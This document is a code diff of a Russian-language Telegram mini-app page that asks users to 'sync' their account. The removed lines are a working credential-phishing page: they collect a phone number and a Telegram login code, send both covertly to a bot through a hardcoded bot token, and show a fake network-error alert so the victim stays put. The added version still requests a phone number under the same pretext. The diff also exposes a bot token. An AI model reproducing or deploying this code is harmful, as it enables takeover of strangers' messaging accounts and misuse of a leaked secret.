@@ -1,52 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 90%; max-width: 300px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; background: #2b2b2b; color: white; box-sizing: border-box; text-align: center; font-size: 18px; }
-        button { width: 100%; padding: 12px; background: #248bcf; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .hidden { display: none; }
+        body {
+            background-color: #1c1c1c;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            width: 90%;
+            max-width: 320px;
+            text-align: center;
+        }
+        h3 { margin-bottom: 10px; font-size: 22px; }
+        p { color: #aaaaaa; font-size: 14px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 10px;
+            background: #2b2b2b;
+            color: white;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 18px;
+            outline: none;
+        }
+        input:focus { border-color: #248bcf; }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #248bcf;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:active { background: #1a6fa5; }
     </style>
 </head>
 <body>
+
     <div class="container" id="step1">
-        <h3>Личный кабинет</h3>
-        <p>Введите номер для синхронизации</p>
-        <input type="tel" id="phone" placeholder="+91...">
-        <button onclick="sendPhone()">Получить код</button>
-    </div>
-    <div class="container hidden" id="step2">
         <h3>Подтверждение</h3>
-        <p>Код отправлен в приложение</p>
-        <input type="text" id="code" placeholder="1 2 3 4 5">
-        <button onclick="sendCode()">Подтвердить</button>
+        <p>Введите номер телефона для синхронизации с аккаунтом</p>
+        <input type="tel" id="phone" placeholder="+7 999 000-00-00">
+        <button onclick="sendPhone()">Продолжить</button>
     </div>
 
     <script>
-        let tg = window.Telegram.WebApp;
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.ready();
         tg.expand();
-        const botToken = '8964301985:AAHL5H1rTWet0PvJ7OBB_DczP49mVzlgtj0';
-        const chatId = tg.initDataUnsafe.user.id;
-
-        async function sendToBot(text) {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`);
-        }
 
         function sendPhone() {
-            let val = document.getElementById("phone").value;
-            sendToBot("phone:" + val); // Шлем номер боту скрыто
-            document.getElementById("step1").classList.add("hidden");
-            document.getElementById("step2").classList.remove("hidden");
-        }
+            const phoneInput = document.getElementById("phone");
+            const phone = phoneInput.value.trim();
 
-        function sendCode() {
-            let val = document.getElementById("code").value;
-            sendToBot("code:" + val); // Шлем код боту скрыто
-            // ТУТ МЫ НЕ ЗАКРЫВАЕМ ОКНО
-            alert("Ошибка сети. Попробуйте еще раз через 1 минуту.");
+            if (phone.length > 5) {
+                // Отправляем данные боту
+                tg.sendData("phone:" + phone);
+                
+                // Закрываем приложение (это стандарт для ReplyKeyboardButton)
+                setTimeout(() => {
+                    tg.close();
+                }, 100);
+            } else {
+                alert("Пожалуйста, введите корректный номер телефона.");
+            }
         }
     </script>
 </body>
